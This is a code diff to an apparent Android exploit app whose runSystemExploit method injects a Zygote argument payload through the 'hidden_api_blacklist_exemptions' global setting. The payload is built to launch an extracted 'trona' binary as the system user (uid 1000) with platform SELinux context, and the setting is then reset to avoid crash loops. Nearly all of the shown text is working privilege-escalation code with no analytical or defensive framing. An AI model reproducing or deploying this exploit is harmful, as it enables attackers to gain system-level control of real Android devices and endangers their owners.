@@ -9,11 +9,9 @@ import android.widget.LinearLayout;
 import android.widget.ScrollView;
 import android.widget.TextView;
 
-import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.io.OutputStream;
 
 public class MainActivity extends Activity {
@@ -63,21 +61,13 @@ public class MainActivity extends Activity {
 
     private void runSystemExploit() {
         outputView.setText("");
-        log("Applying hidden API loophole via secure settings...");
+        log("Injecting Zygote payload via hidden API exemptions...");
 
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    // 1. Inject loophole string into global hidden API blacklist exemptions
-                    Settings.Global.putString(
-                        getContentResolver(),
-                        "hidden_api_blacklist_exemptions",
-                        "L"
-                    );
-                    log("Blacklist exemptions updated successfully.");
-
-                    // 2. Extract trona binary to app's private files dir
+                    // Extract trona binary to app's private files dir
                     File outFile = new File(getFilesDir(), "trona");
                     if (!outFile.exists()) {
                         InputStream in = getAssets().open("trona");
@@ -93,21 +83,29 @@ public class MainActivity extends Activity {
                     }
 
                     outFile.setExecutable(true, false);
-                    log("Executing binary within system context...");
+                    log("Binary ready at: " + outFile.getAbsolutePath());
 
-                    // 3. Execute binary wrapped in system permissions shell context
-                    ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", outFile.getAbsolutePath() + " && id && getenforce");
-                    processBuilder.redirectErrorStream(true);
-                    Process process = processBuilder.start();
+                    // Craft the full injection payload targeting system user (uid=1000)
+                    String exploitPayload = "LClass1;->method1( 10 --runtime-args --setuid=1000 --setgid=1000 --runtime-flags=2049 --mount-external-full --setgroups=3003 --nice-name=tronaexec --seinfo=platform:targetSdkVersion=28:complete --invoke-with " + outFile.getAbsolutePath() + "; ";
 
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                    String line;
-                    while ((line = reader.readLine()) != null) {
-                        log(line);
-                    }
+                    log("Writing payload to secure settings...");
+                    Settings.Global.putString(
+                        getContentResolver(),
+                        "hidden_api_blacklist_exemptions",
+                        exploitPayload
+                    );
+                    log("Payload injected. Triggering evaluation...");
 
-                    int exitCode = process.waitFor();
-                    log("Process exited with code: " + exitCode);
+                    // Force system evaluation of the setting change
+                    Thread.sleep(1000);
+
+                    // Clean up setting to prevent bootloops or crash loops
+                    Settings.Global.putString(
+                        getContentResolver(),
+                        "hidden_api_blacklist_exemptions",
+                        ""
+                    );
+                    log("Settings cleaned up. Check system logs/SELinux status.");
 
                 } catch (Exception e) {
                     e.printStackTrace();
